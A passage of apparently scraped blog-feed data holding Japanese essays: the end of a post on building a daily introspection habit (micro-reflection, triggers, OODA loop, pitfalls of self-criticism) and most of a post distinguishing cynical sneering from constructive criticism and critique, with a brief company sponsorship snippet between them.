型：知的好奇心、深い理解、本質の追求。「なぜこうなるのか」を知りたい。創造型：新しいものを作る、ゼロから生み出す。何もないところから何かを作ることに喜びを感じる。解決型：問題を解く、課題を克服する。難しい問題への挑戦と解決に楽しさを覚える。貢献型：誰かの役に立つ、価値を届ける。ユーザーの喜ぶ姿を想像するとモチベーションが上がる。達成型：目標を達成する、成果を出す。具体的な目標があると燃える。協働型：人と一緒に、チームで、コミュニティで。一人より複数人で取り組む方が楽しい。成長型：学ぶこと、成長すること、上達すること。新しいスキルの習得に楽しさを覚える。自律型：自分のペースで、自分の判断で、自由に。裁量の有無が重要。自分の動機の源を見つけるための質問。最もやりがいを感じた仕事・プロジェクトは？時間を忘れて没頭した経験は？ストレスを感じる仕事・状況は？（それは動機の源が満たされていない状況だ）他人の成功を見て、羨ましいと感じるのはどんな時？（嫉妬は、自分の欲望を教えてくれる）お金をもらえなくてもやりたいことは？（それが、最も純粋な動機の源だ）動機の源を知ることは、自分を動かす燃料を知ることです。この気づきがあれば、次の行動が変わります。内省を習慣化する内省の重要性は分かりました。やり方も分かりました。でも、続きません。なぜでしょうか。内省を「特別なこと」だと思っているからです。内省は歯磨きのように、当たり前の習慣として、毎日やります。「今日は内省の日だ」ではなく、「毎日少しずつ振り返る」。これが継続の鍵です。原則1：超小型化（マイクロ・リフレクション）。「毎日30分、じっくり振り返る」。これは続きません。ハードルが高すぎます。最初は、1分でいい。いや、30秒でもいい。朝の内省（30秒）：今日、一番大切なことは何か？（1つだけ）。夜の内省（1分）：今日、うまくいったことは？明日、何か1つ変えるなら？これだけで十分です。完璧な内省より、継続する内省の方が、遥かに価値があります。原則2：トリガーを設定する。「内省しよう」と思い出すのは難しいです。だから、トリガーを設定します。トリガー＝既存の習慣＋内省。例：コーヒーを淹れた直後、今日の優先事項を1つ決める。通勤電車へ乗った直後、昨日の学びを1つ思い出す。歯を磨いた直後、今日のベストモーメントを1つ思い出す。ベッドへ入った直後、明日変えたいことを1つ決める。既存の習慣と組み合わせることで、新しい習慣は定着しやすくなります。原則3：書くことで可視化する。頭の中で考えるだけでは、内省は深まりません。紙に書く。または、デジタルでもいい。とにかく、言葉にして外に出す。書くことの効果。思考が整理される。頭の中でぐるぐる回っていた考えが、言葉になると整理される。曖昧だった感情が、書くことで明確になる。パターンが見える。書き溜めると、自分のパターンが目に見える形で現れる。「ああ、また同じことで悩んでいる」。過去の自分と対話できる。1ヶ月前に書いた内省を読み返す。「あの時はこう考えていたんだ」。成長が実感できる。重要なのは、書く場所ではなく、書き続けることだ。原則4：失敗を喜ぶ習慣。最も深い学びは、失敗から生まれる。でも、多くの人は失敗を恐れる。失敗を隠す。失敗から目を背ける。これが、最大の機会損失です。失敗＝学びのチャンス。この認識を持ちます。失敗したとき、こう考える：「ラッキー。これは学びの機会だ」。失敗を振り返るとき、3層構造が特に有効だ。表層の反応だけでなく、深層の前提まで掘り下げることで、本質的な学びが得られる。この振り返りを習慣化すると、失敗が「叡智」に変わる。成功体験は心地よいが、学びは浅い。失敗体験は苦しいが、学びは深い。だから、良質な内省によって、過去の失敗体験すべてが、未来の資産になります。原則5：内省の相棒を作る。一人で内省するのは、時に難しい。だから、内省パートナーを持つ。週に一度、30分、お互いの1週間を振り返る。お互いの経験を共有する。相手の話を聞いて、気づいたことを伝える。自分では見えない盲点を指摘し合う。他者の視点が入ることで、内省は格段に深まる。注意点：アドバイスではなく、観察を共有する。批判ではなく、気づきを提供する。問題解決ではなく、理解を深める。生成AIでも良い。内省と行動のサイクル内省だけでは意味がありません。行動に移さなければ、ただの自己満足です。逆に、行動だけでも意味がありません。振り返らなければ、同じ失敗を繰り返します。必要なのは、内省と行動のサイクルです。ここで重要な区別があります。内省には、実は2つの種類があります。行為の中の内省は、実践の最中に行われるリアルタイムの思考です。「足元で考える」とも表現され、教師が授業中に生徒の反応を見て即座に教え方を調整したり、看護師が患者の微細な変化を察知して対応を変えたりする場面に見られます。これは直観的で暗黙的な知識に基づき、「行為の現在」の中で展開されます。一方、行為についての内省は、行為が完了した後に行われる振り返りです。何が起きたのか、なぜそう行動したのか、何を違った方法でできたかを体系的に分析します。より分析的で意識的な思考プロセスであり、理論的知識を統合できます。優れた専門家は、この2つの内省を使い分け、常に「これで十分か？もっと良い方法はないか？」と自問し続けます。多くの人が知っているフレームワークに、PDCAサイクルがあります。Plan（計画）→Do（実行）→Check（確認）→Act（改善）。でも、現代の変化の速い環境では、PDCAは遅すぎます。より有効なのは、OODAループです。Observe（観察）→Orient（状況判断）→Decide（意思決定）→Act（行動）。そして、内省は、この「Orient（状況判断）」のフェーズに該当します。Observe（観察）：何が起きたのか、事実を観察する。Orient（状況判断）：内省によって、その事実の意味を理解する。Decide（意思決定）：次に何をするか決める。Act（行動）：実際に行動する。このループを高速で回す。一日に何度も回す。朝：昨日の振り返り（Observe & Orient）→今日の計画（Decide）→実行（Act）。昼：午前の振り返り（Observe & Orient）→午後の調整（Decide）→実行（Act）。夜：一日の振り返り（Observe & Orient）→明日の準備（Decide）。内省を「月に一度の大掃除」にしない。「毎日の歯磨き」にする。小さな実験を繰り返す。内省から得た洞察を、すぐに試す。「自分は午前中が最も集中できる」と気づいた→明日から、重要なタスクを午前中に配置する。「スマホが視界にあるだけで集中力が落ちる」と気づいた→今日から、作業中はスマホを別の部屋に置く。「人と話すことでアイデアが整理される」と気づいた→週に一度、同僚とブレストの時間を作る。大きな変化を起こそうとしない。小さな実験を繰り返す。そして、その実験の結果をまた内省する。「うまくいった」「うまくいかなかった」。なぜそうなったのか。次はどう調整するか。この小さなサイクルの積み重ねが、大きな変化を生む。停滞している。成長が感じられない。同じところで躓いている。この時、多くの人は焦る。「もっと頑張らなきゃ」「違う方法を試さなきゃ」。でも、違う。停滞しているなら、まず観察しろ。内省しろ。なぜ停滞しているのか。何が障害になっているのか。どんなパターンが繰り返されているのか。停滞そのものは問題ではない。停滞を観察しないことが問題です。内省によって停滞の構造が見えれば、抜け出す道も見えてくる。内省がもたらす3つの変化内省を習慣化すると、3つの大きな変化が起きる。1. 自分の「癖」が見える。私たちは、自分の行動パターンに気づいていない。プレッシャーがかかると他人のせいにする癖。不安になると無意味に情報を集める癖。褒められると調子に乗ってしまう癖。批判されると防御的になる癖。これらの癖は、無意識のうちに判断を歪める。でも、内省を続けると、これらの癖が見えてくる。「ああ、また同じパターンだ」。癖が見えるようになると、コントロールできるようになる。「今、防御的になりそうだ。でも、一度深呼吸して、相手の意見を聞いてみよう」。自己認識が高まることで、自己制御が可能になる。2. 「なぜ」が分かる。なぜモチベーションが上がらないのか。なぜあの判断をしたのか。なぜあの人とうまくいかないのか。内省を続けると、これらの「なぜ」に答えが見つかる。そして、答えが見つかると、解決策も見えてくる。モチベーションが上がらないのは、動機の源が満たされていないから→満たす方法を考える。あの判断をしたのは、過去の失敗体験から生まれた思い込みがあるから→その思い込みを検証する。あの人とうまくいかないのは、コミュニケーションの価値観が違うから→歩み寄る方法を探す。表面的な対症療法ではなく、根本的な解決ができるようになる。3. 同じ失敗を繰り返さなくなる。最も大きな変化は、これだ。内省なしに生きると、同じ失敗を何度も繰り返す。なぜなら、失敗から学んでいないからだ。内省を習慣化すると、失敗のたびに学びを抽出する。そして、その学びを次に活かす。完全に失敗を避けることはできない。でも、同じ失敗は避けられるようになる。そして、失敗の種類が変わる。同じレベルの失敗を繰り返すのではなく、より高いレベルの新しい失敗をするようになる。これが、成長だ。内省における3つの落とし穴内省は強力なツールだが、間違った使い方をすると、逆効果になる。落とし穴1：自己批判に陥る。内省と自己批判は違う。内省は客観的だ。「なぜこうなったのか」を冷静に分析する。自己批判は感情的だ。「自分はダメだ」と自分を責める。「今日は何もできなかった。自分は無能だ。才能がない。生きている価値がない」。これは内省ではない。破壊的な自己批判です。内省するときは、自分を責めません。ただ、観察する。「今日、予定していたタスクの半分しかできなかった。なぜか。午後に対応で2時間使った。スマホを見て30分使った。ここに改善の余地がある」。事実を淡々と見る。感情的になりません。自分を責めません。落とし穴2：分析で満足する。内省して、パターンが見えた。「ああ、なるほど」と理解した。それで終わり。これでは意味がありません。内省の目的は、理解することではない。行動を変えることだ。「スマホが集中を妨げている」と気づいた→では、明日からスマホをどうするのか。「午前中が最も集中できる」と分かった→では、タスクの配置をどう変えるのか。内省から得た洞察を、具体的な行動に変換する。この最後のステップを忘れません。落とし穴3：過去にとらわれる。内省は、過去を振り返る行為だ。しかし、目的は未来にある。過去の失敗を延々と反芻する。「あの時、ああすればよかった」「なんであんなことをしてしまったんだ」。これは内省ではなく、後悔です。内省は、過去から学びを抽出して、未来に活かす。過去にとらわれるのではなく、過去から自由になるための行為だ。「過去は変えられない。けれども、未来は変えられる」。この視点を忘れません。おわりに深夜、一人でデスクに向かっている。誰にも邪魔されない時間。昔は、こういう時間が好きだった。新しいことを試すのも、問題と格闘するのも、全部楽しかった。いつから、仕事になったんだろう。「仕事だから」「やらなきゃいけないから」。そういう理由で物事を進めるようになった。楽しさより、効率。ワクワクより、締め切り。それは成長なのか。大人になることなのか。それとも、どこかで道を間違えたのか。このポストを書きながら、ずっと考えていた。内省って、結局何なんだろうって。自分と向き合うって、どういうことなんだろうって。答えは、最後まで出なかった。でも、一つだけ分かったことがある。問い続けることは、終わらない。「今の仕事、本当に続けたいのか」「この選択は、本当に自分がやりたいことなのか」「このままでいいのか」。この問いに、完璧な答えなんてない。今日の答えと明日の答えは違うかもしれない。去年の答えと今年の答えは、絶対に違う。それでいいんだと思う。変わることを恐れなくていい。「昔はこう思ってたのに、今は違う」。それは裏切りじゃない。成長だ。「去年まで好きだったことに、今は興味がない」。それは飽きっぽいんじゃない。進化だ。「ずっと目指してたものに、もう魅力を感じない」。それは意志が弱いんじゃない。自分を知ったんだ。人間は変わる。環境も変わる。価値観も変わる。定期的に、自分をアップデートする必要がある。不要になった考え方は手放す。新しい価値観を取り入れる。古い思い込みを捨てる。それが、内省なんじゃないだろうか。最後に、一つだけお願いがある。この本を読み終えて、「よし、明日から毎日内省するぞ！」とは思わないでほしい。内省は、そんな気合を入れてやるものじゃない。もっと軽い、日常の中でふと立ち止まる瞬間みたいなものだ。通勤電車の中で、ぼんやり窓の外を眺めながら。仕事の合間に、ふと今日のことを振り返りながら。夜、ベッドに入って、一日を思い出しながら。「今日、私は何を感じたんだろう」。そう、自分に問いかけてみる。それだけでいい。答えが見つからなくてもいい。考えるのが面倒になったら、やめてもいい。また明日、思い出した時に、やればいい。あなたの内面は、あなたしか見えない。他人には理解できない感情がある。他人には分からない価値観がある。あなただけが知っている、心の動きがある。だから、時々でいい。自分の内側を、ゆっくり覗いてみてほしい。日記を書くように、自分の思考を言葉にしてみてほしい。整理整頓するように、生き方を見直してみてほしい。完璧な答えなんて存在しない。完璧な人生も存在しない。ただ、少しずつ、より良くすることはできる。それが、生きるということなのかもしれない。「人の器」を測るとはどういうことか　成人発達理論における実践的測定手法作者:オットー・ラスキー,中土井僚日本能率協会マネジメントセンターAmazonリフレクション（REFLECTION） 自分とチームの成長を加速させる内省の技術 (オリジナルフレームワークPPT・PDF特典付き)作者:熊平美香ディスカヴァー・トゥエンティワンAmazonリフレクティブ・マネジャー 一流はつねに内省する (光文社新書 425)作者:中原 淳,金井 壽宏光文社Amazon限りある時間の使い方作者:オリバー・バークマンかんき出版Amazon不完全主義　限りある人生を上手に過ごす方法作者:オリバー・バークマンかんき出版Amazon社会は、静かにあなたを「呪う」　～思考と感情を侵食する“見えない力”の正体～ (小学館クリエイティブ)作者:鈴木祐小学館Amazonムダに悩まない練習　限りある時間を「行動」に使うための脳科学＆心理学作者:ハ・ジヒョン大和書房AmazonＯＯＤＡ　ＬＯＯＰ（ウーダループ）―次世代の最強組織に進化する意思決定スキル作者:チェット リチャーズ東洋経済新報社Amazon人生の大問題と正しく向き合うための認知心理学 (日経プレミアシリーズ)作者:今井むつみ日経BPAmazon認知バイアス　心に潜むふしぎな働き (ブルーバックス)作者:鈴木宏昭講談社Amazon","isoDate":"2025-11-12T00:59:35.000Z","dateMiliSeconds":1762909175000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"スリーシェイク、「第58回 情報科学若手の会」にスポンサーとして協賛および登壇","link":"https://sreake.com/blog/wakatenokai/","contentSnippet":"株式会社スリーシェイク（本社：東京都中央区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 2025年 10月11日（土）〜 13日（月）に開催された「第58回 情報科学若手の会」にスポンサーとして協賛しました。The post スリーシェイク、「第58回 情報科学若手の会」にスポンサーとして協賛および登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-11-11T01:00:00.000Z","dateMiliSeconds":1762822800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"おい、冷笑すんな","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/10/084205","contentSnippet":"はじめにSNSを開けば、今日もまた誰かが何かに本気だ。新しい技術やフレームワークに興奮するエンジニア。最新のビジネス書を読んで「人生が変わった」と叫ぶビジネスパーソン。世の中の理不尽に憤慨し、世界を変えようと声を上げる活動家。生成AIの新機能やツールのアップデートに「未来が来た」と歓喜する人々。自己啓発系インフルエンサーの「新しい生き方」に感銘を受け、それがストア哲学やブッダの教えの言い換えに過ぎないと気づかない人々。世の中には、あらゆることに本気になれる人がいるものだ。私は、一歩引いた場所から、彼らを観察していた。興味深い現象として。分析対象として。本を読んだ。いろんな本を。技術書も哲学書も歴史書も。視野が広がった。気づけば環境問題も、格差も、戦争も、技術トレンドも、ビジネス理論も、すべてが複雑に絡み合った世界が見えていた。そして同時に、絶望も見えた。簡単な解決策などない。誰かの正義は誰かの不正義になる。理想を語る人々は、現実を知らないナイーブな存在に見える。新しい技術に興奮する人々は、過去の失敗から学んでいない。いつの間にか、私は冷笑するようになっていた。「どうせ無理だ」「意識高いなー(笑)」「また同じパターンか」。この言葉が、自然と口をついて出る。誰かの熱狂を見るたびに、冷めた目で見る。誰かの理想を聞くたびに、「現実はもっと複雑だ」と心の中で呟く。冷笑は、気持ち良かった。「ほら、やっぱりね」という優越感。自分は騙されていない。自分は賢い。自分だけが、一歩引いた場所から、冷静に世界を見ている。そして何より、楽だった。本気で向き合わなくていい。熱狂しなくていい。責任を取らなくていい。傍観者でいればいい。シニカルな冷笑主義者としてのアイデンティティが、確立しつつあった。でも、ある時、気づいた。自分は、冷笑と批判と批評の違いが分かっていなかった。そして同時に、世の中の多くの人も分かっていない。建設的な批判を「冷笑主義だ」とレッテル貼りして封じようとする人がいる。一方で、ただの冷笑を「正当な批判だ」と正当化する人もいる。視野を広げることは重要だ。でも、視野を広げすぎると、絶望に囚われる。冷笑してはいけない。でも、批判することは必要だ。この複雑さは、白か黒かで割り切れない。グラデーションを見る必要がある。そして、すべてに答えを出そうとする必要などない。視野を広げすぎた先で絶望する人は、「すべてを理解し、すべてに答えを出さなければならない」という幻想に囚われている。でも、自分の限界を認め、自分が語れる一点に集中すればいい。これは、視野を広げすぎて冷笑に陥った一人の人間が、そこから抜け出そうともがいた記録だ。明確な答えがあるわけではない。でも、少なくとも、「冷笑と批判と批評は違う」という認識から始めることはできる。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。冷笑と批判と批評を分けるまず、最も重要な区別をする必要がある。冷笑と、批判と、批評は、まったく別のものだ。批判は、方法を問う批判は、対象の方法や論理の問題点を具体的に指摘することだ。「ここに問題がある。なぜならこういう理由だ。こうすればより良くなる」。批判は、相手の動機を尊重する。「あなたが目指していることは理解できる。でも、この方法では難しい」。動機は肯定し、方法を問う。批判は、具体的だ。「ここのロジックが弱い」「このデータは信頼性が低い」「この前提は間違っている」。何が問題なのか、明確に指摘する。批判は、代替案を持つ。「こうしたらどうか」「この方法の方が良い」「別の視点から考えると」。ダメ出しで終わらず、次につながる提案をする。批判は、建設的だ。次の行動につながる。改善の機会を生む。批評は、価値を問う批評は、対象を評価・分析することだ。「この作品の意図は何か」「この技術はどういう文脈で生まれたのか」「これはどういう意味を持つのか」。批評は、対象を理解しようとする。表面だけでなく、背景にある思想や文脈を読み解こうとする。批評は、多面的だ。1つの視点だけでなく、複数の視点から対象を見る。「こういう見方もできる」「別の角度から見ると」。批評は、深さを求める。表面的な評価ではなく、本質的な価値を問う。批評は、対話的だ。対象との対話。読者との対話。異なる解釈との対話。冷笑は、動機を疑う冷笑は、対象の動機そのものを疑い、嘲笑することだ。「どうせ自己満足だろう」「意識高い系(笑)」「偽善者め」。冷笑は、曖昧だ。具体的な問題点を指摘するのではなく、全体を漠然と貶める。「ダメなものはダメ」「どうせ無理」。冷笑は、代替案を持たない。否定するだけ。笑うだけ。次がない。冷笑は、破壊的だ。何も生み出さない。改善の機会を奪う。対話を殺す。重要なのは、この区別を高解像度で見ること「このコードは、こういう理由でスケールしない。別のアプローチを検討すべきだ」――これは批判だ。具体的に問題点を指摘し、方向性を示している。「このコードは素人レベル」――これは冷笑だ。曖昧に貶めているだけで、何が問題なのか、どう改善すべきなのか、何も示していない。「この技術ブログは、初心者向けとしては分かりやすい。ただ、この部分の説明は不正確だ。正確には〜という動作をする。この違いを明記した方が、読者の理解が深まる」――これは批判だ。評価した上で、具体的な問題点と改善案を示している。「この技術ブログは浅い。もっと深い内容を期待していた」――これは批評寄りだが、曖昧だ。何が浅いのか、どういう深さを期待していたのか、明確ではない。「この技術ブログを書いた人は、目立ちたいだけ。本当に理解しているのか怪しい」――これは冷笑だ。動機を疑い、能力を貶めている。この違いを理解せずに、すべての批判を「冷笑主義だ」とレッテル貼りすることは、危険だ。逆に、すべての冷笑を「正当な批判だ」と正当化することも、危険だ。高解像度で見ること。その発言は、動機を問うのか、方法を問うのか、価値を問うのか。具体的なのか、曖昧なのか。代替案があるのか、ないのか。この区別ができて初めて、冷笑と批評を適切に扱える。日常での例：若い新卒のエンジニアが「新しいフレームワークを使いたい」と提案した場合。冷笑的な反応なら →「また流行に乗りたいだけでしょ(笑)　どうせすぐ廃れるよ」（動機を疑い、否定する）批判的な反応なら →「このプロジェクトの規模だと過剰設計では。まず既存の技術で試してから判断しては」（方法を問い、代替案を示す）批評的な反応なら →「なぜそのフレームワークが適切だと考えたのか聞かせて。チームの学習コストも含めて検討したい」（価値を問い、理解しようとする）友人が「副業を始めたい」と話した場合。冷笑的な反応なら →「意識高いなー(笑)　どうせ続かないって」（動機を疑い、嘲笑する）批判的な反応なら →「本業との時間配分は大丈夫。週にどれくらい時間を確保できそう」（具体的な問題点を確認する）批評的な反応なら →「副業を始めたい理由は何だろう。収入、スキル、それによってアプローチが変わるはず」（背景を理解しようとする）正直に言おう、冷笑は気持ちいい――その快楽の解剖冷笑は、気持ちいい。それを否定する必要はない。しかし、その快楽の正体を、高解像度で見てみよう。優越感という麻薬誰かが理想を語る。「世界を良くしたい」「この技術で社会を変えたい」と。その瞬間、頭の中で何かが動く。「どうせ無理だろう」。この声は、静かだ。でも、確信に満ちている。そして、案の定その人が失敗する。プロジェクトが頓挫する。理想が現実の前に砕ける。「ほら、やっぱりね」この瞬間の快感。私は騙されなかった。私は現実を見ていた。私は賢かった。他の人々が理想に浮かれている中で、私だけが冷静だった。私だけが「本当のこと」を見抜いていた。この優越感は、麻薬のようだ。一度味わうと、また求めてしまう。ゼロコストの知的快楽誰かが情熱を持って何かに取り組んでいる。深夜まで残ってコードを書いている。週末も技術を学んでいる。カンファレンスで登壇している。「意識高い系(笑)」この一言で、その人の努力、情熱、時間、すべてを無効化できる。その人が本気で何かを信じていることを、「ナイーブだ」と笑える。そして、自分は安全地帯にいる。リスクを取っていない。傷つかない。行動するには、時間がかかる。エネルギーがかかる。リスクを取る必要がある。失敗する可能性がある。傷つく可能性がある。でも、冷笑するだけなら、何もいらない。そして、何より、楽だ。本気で向き合わなくていい。深く考えなくていい。責任を取らなくていい。斜めから見ていればいい。一歩引いた場所から観察していればいい。「あいつら、必死だな」と笑っていればいい。この楽さは、中毒性がある。一度この楽さを知ってしまうと、本気で向き合うことが馬鹿らしく感じる。必死になることが恥ずかしく感じる。「冷静な自分」でいることが、賢いことのように思える。冷笑は、気持ちいいだけじゃない。楽なのだ。キーボードを叩くだけで、誰かの努力を無効化できる。マウスをクリックするだけで、誰かの理想を笑える。何も作らず、何も提案せず、何もリスクを取らず、批判するだけ。笑うだけ。「どうせ無理」と言うだけ。それで「賢い人」として扱われる。「現実を見ている人」として認められる。「冷静な分析ができる人」として評価される。知的ゲームとしての矛盾指摘誰かの矛盾を指摘する。プレゼンの中の論理の穴を見つける。ブログ記事の中の曖昧な表現を突く。コードの中の非効率な実装を指摘する。「ここ、おかしくないですか?」相手が言葉に詰まる。説明に窮する。その瞬間の快感。私は頭がいい。私は見抜いた。私は勝った。矛盾を見抜く知的な快楽。現実を冷静に分析する快楽。感情に流されない快楽。誰かが必死になっている姿を、客観的に観察する快楽。「みんな必死だな」と、一歩引いた場所から眺める快楽。これは、ある種のゲームだ。相手の弱点を見つける。論理の隙を突く。勝敗がはっきりしている。そして、勝てば気持ちいい。即座の承認と自己肯定誰かがブログ記事を書く。読む。矛盾を見つける。コメント欄に書き込む。「ここの説明は不正確ですね」。投稿ボタンを押す。数時間後、通知が来る。誰かが「いいね」をした。誰かがリツイートした。「鋭い指摘ですね」というリプライが来た。この瞬間の快感。私は認められた。私は賢いと思われた。私の知性が評価された。そして、何より、私は何も失っていない。ブログ記事を書くのに何時間もかかる苦労はしていない。推敲する時間もかけていない。公開する勇気も必要なかった。ただ、数分で批判を書いただけ。それで、評価された。これが、冷笑の快楽の本質だ。最小のコストで、最大の優越感と承認を得られる。この「豊かさ」は本当に豊かなのか「冷笑主義に関してはお前の感性が乏しいだけ。楽しめる人の方がよっぽど豊かなんです」――この言葉には、一理ある。確かに、冷笑を楽しめることは、ある種の知的な能力だ。矛盾を見抜く力。現実を分析する力。感情に流されない力。これらは価値がある。でも、問題は別のところにある。その快楽が、あなた自身の行動を止めていないか。優越感が、成長を止めていないか。その「豊かさ」が、実は安全地帯に留まるための言い訳になっていないか。冷笑を楽しめることが豊かなのではない。冷笑の快楽を知った上で、それでも行動することが豊かなのだ。矛盾を見抜く力を持った上で、何かを信じること。現実の複雑さを知った上で、一歩を踏み出すこと。感情に流されない力を持った上で、感動すること。本当の豊かさは、冷笑の快楽と、行動の勇気の、両方を持つことだ。冷笑だけを楽しむことは、豊かではない。それは、片足だけで立っているようなものだ。バランスを欠いている。持続しない快楽の正体そして、もっと重要なことがある。冷笑の快楽は、短期的なものだ。その瞬間は気持ちいい。「ほら、やっぱりね」と優越感を覚える。「私は賢い」と自己肯定感が満たされる。でも、この快楽は持続しない。なぜなら、冷笑は何も生み出さないからだ。一年後、十年後、あなたが振り返った時、冷笑していた時間は何を残しているだろうか。「あの時、あのブログ記事の矛盾を指摘した」という記憶。「あの時、あのプロジェクトが失敗すると予測した」という記憶。優越感を覚えた瞬間の記憶だけだ。それ以外に何も残っていない。一方、建設的に関わった時間は結果を残す。行動した時間は、さらに多くを残す。失敗も成功も学びも成長も、すべて残る。そして、何より、「自分は行動した」という事実が残る。ブログを書いた。コードを書いた。プレゼンをした。プロジェクトを立ち上げた。失敗した。学んだ。また挑戦した。これらは、すべて残る。あなたの中に残る。世界に残る。だから、私はこう問いたい。冷笑を楽しむことが豊かだというなら、その豊かさは、十年後にも残っているのか。感性が乏しいのは、冷笑を楽しめない人ではない。冷笑の快楽しか知らない人だ。本当に感性が豊かな人は、冷笑の快楽も、批評の深さも、行動の喜びも知っている。創造する充実感も知っている。私は、冷笑の快楽を否定しない。ただ、それが唯一の快楽だと思わないでほしい。それがすべてだと思わないでほしい。もっと大きな快楽がある。もっと深い充実感がある。もっと持続する豊かさがある。それは、行動すること。創造すること。リスクを取ること。そして、時には失敗すること。冷笑の快楽を知った上で、それでも行動する。この両方を知っている人こそが、本当に豊かな人だ。視野を広げた先にある絶望。そして冷笑へ視野を広げれば広げるほど、世界の複雑さが見えてくる。簡単な解決策などない。どんな行動にも副作用がある。誰かの正義は、誰かの不正義になる。理想的な制度など存在しない。すべてはトレードオフだ。視野を広げれば広げるほど、世界は希望ではなく絶望に満ちているように見えてくる。何かを変えようとする試みは、あまりにも無力に見える。理想を語る人々は、現実を知らないナイーブな存在に見える。そして、この絶望が、冷笑を生む。冷笑主義は、絶望の裏返しだ。世界を変えられないという絶望。自分には力がないという絶望。この絶望を直視する代わりに、他人を嘲笑することで、自分は少なくとも「騙されていない賢い人間だ」と思い込む。視野を広げすぎて、複雑さに圧倒されて、行動が麻痺する。そして、その麻痺を正当化するために、冷笑する。「どうせ無理だ」と言っておけば、自分が行動しないことを正当化できる。「現実はもっと複雑だ」と言っておけば、他人の試みを笑える。「あなたは世界を知らない」と言っておけば、自分は賢いと思える。これが、視野を広げすぎることの罠だ。世界の複雑さを知ることは重要だ。でも、その複雑さに圧倒されて、行動を止めてしまうなら、知らない方がマシだったかもしれない。視野を広げることで、私は批判と冷笑の違いを学んだ。でも同時に、冷笑の甘い罠にも落ちかけた。語りえぬものについて――あるいは、全てに答えを出そうとする傲慢さ視野を広げすぎた先で、私はもう1つの重要なことに気づいた。世の中には、言葉で説明できないことがある。道徳、倫理、美しさ、信仰。これらは論理的に「正解」を出せるものではない。でも、視野を広げすぎた人間は、これらにも「正しい答え」があると思い込む。全てを言葉で説明できると考える。全てを論理的に割り切れると信じる。そして、答えが出せないことに気づくと、絶望する。「こんなに複雑なのか」「矛盾だらけじゃないか」「結局、誰も答えを持っていない」。その絶望が、冷笑を生む。でも、待ってほしい。そもそも、全てに答えを出す必要などないのだ。環境問題について、明確な答えを持つ必要はない。格差について、万人が納得する解決策を見つける必要はない。技術選定について、絶対的に正しい判断を下す必要はない。言葉で説明できないことは、説明しなくていい。答えが出ないことは、答えを出さなくていい。世の中が広がりすぎて、全てを理解することなど不可能なのだ。これは諦めではない。冷笑でもない。これは、自分の限界を謙虚に認めることだ。言葉で全てを割り切れると考えてしまうのは、人間の「おごり」だ。この傲慢さが、視野を広げすぎた人を冷笑に追い込む。「全てに答えを持たなければならない」というプレッシャーが、「どうせ答えなんてない」という絶望を生む。そして、絶望が冷笑を生む。でも、本当は違う。全てに答えを出そうとしなくていい。自分が深く関わる一点だけに集中すればいい。他のことは、今は考えなくていい。今は分からないことは、分からないままでいい。視野を広げることで、世界の複雑さを知る。それは大切だ。でも、その複雑さの全てに答えを出そうとする必要はない。説明できないものは、無理に説明しなくていい。そして、自分が語れる一点、自分が行動できる一点に、全力を注げばいい。これを「冷笑主義だ」と言うなら、それは誤解だ。私は何も冷笑していない。ただ、自分の限界を認めている。全てを説明できるという幻想を捨てている。そして、その上で、自分にできることに集中している。考えを言葉にすることと、冷笑は違う。答えを出さないことと、冷笑は違う。低い解像度で混同するな。視野を広げて複雑さを知ることと、その複雑さの全てに答えを出そうとすることは違う。むしろ、自分が深く関わる一点だけに集中する――この視野を意図的に狭めることこそが、冷笑から抜け出す鍵になる。境界線は、実は曖昧だここで重要な認識がある。冷笑と批判と批評の境界線は、明確ではない。私が「これは建設的な批判だ」と思って発言したことが、相手には「冷笑」に聞こえる。例えば、「このコードは、こういう理由でスケールしない。別のアプローチを検討すべきだ」という指摘。私は具体的に問題点を指摘し、代替案の方向性も示している。これは建設的批判のつもりだ。でも、相手からは「結局ダメ出ししているだけじゃないか」「自分では実装しないくせに」「冷笑主義者だ」と受け取られるかもしれない。逆に、私が「これは明らかに冷笑だ」と思う発言が、本人は「正当な批判だ」と思っている。境界線は、曖昧だ。グラデーションだ。白か黒かでは割り切れない。そして、もっと複雑なのは、同じ人間の中に、建設的批判と冷笑が混在していることだ。私がある問題を指摘する。その動機の70%は「より良くしたい」という建設的な意図だ。でも、30%は「優越感」という冷笑的な動機が混じっている。純粋な批判だけというものは、ほぼ存在しない。冷笑だけというものも、実は少ない。ほとんどの場合、混ざっている。だからこそ、「冷笑主義だ」というレッテル貼りは危険だ。普通に気になる部分に対する言及を冷笑主義だけでキャンセルできると思うなここで強調したいのは、「冷笑主義」というレッテル貼りで、すべての批判を無効化しようとする態度の危険性だ。私が何かの問題点を指摘する。論理の矛盾を指摘する。データの不備を指摘する。すると、「それは冷笑主義だ」と言われる。「あなたは何も行動していない」「傍観者だ」「批判するだけで代替案がない」。待ってくれ。私は、ちゃんと考えている。具体的に指摘している。なぜその方法では難しいのか、論理的に説明している。可能であれば、代替案も提案している。それを「冷笑主義」の一言で片付けられることに、強く反発する。普通に気になる部分に対する言及を、「冷笑主義」というレッテル貼りだけでキャンセルできると思うな。批判を封じることは、思考を止めることだ。議論を殺すことだ。改善の機会を失うことだ。もし冷笑や批判、批評が全てダメだというのであれば、それは思考停止を意味するのではないだろうか。例えば、世の中に溢れる全てのビジネス書を無批判に信じて、矛盾する内容であっても全て実践するのか? それは現実的に不可能だし、批判的思考を放棄することになる。むしろ、健全な批評精神を持ちながら、有益な情報を選別し、自分の状況に合わせて取り入れることこそが重要ではないだろうか。もちろん、建設的でない批判もある。ただ嘲笑するだけの冷笑もある。でも、すべての批判がそうではない。ちゃんと考えた上での批判もある。具体的な問題点を指摘する批判もある。この区別をせずに、すべてを「冷笑主義」と呼ぶことは、知的誠実性を欠いている。低い解像度で物事を見るな。高い解像度で見ろ。その批判は、動機を疑っているのか、方法を疑っているのか。価値を問うているのか。嘲笑しているのか、改善案を提案しているのか。リスクを取らずに安全地帯から石を投げているのか、自分もリスクを取って一緒に考えようとしているのか。この区別ができないなら、「冷笑主義」という言葉を使うべきではない。考えを言葉にすることと、冷笑は違う。低い解像度で冷笑主義って言わないでくれ。境界線が曖昧だからこそ、高い解像度で見る努力が必要だ。「これは冷笑だ」「これは批判だ」「これは批評だ」と単純に割り切るのではなく、そのグラデーションを見る。その発言の中に、どれくらい建設的な意図があって、どれくらい冷笑的な動機があるのか。正確には測れない。でも、考える価値はある。SNSと現実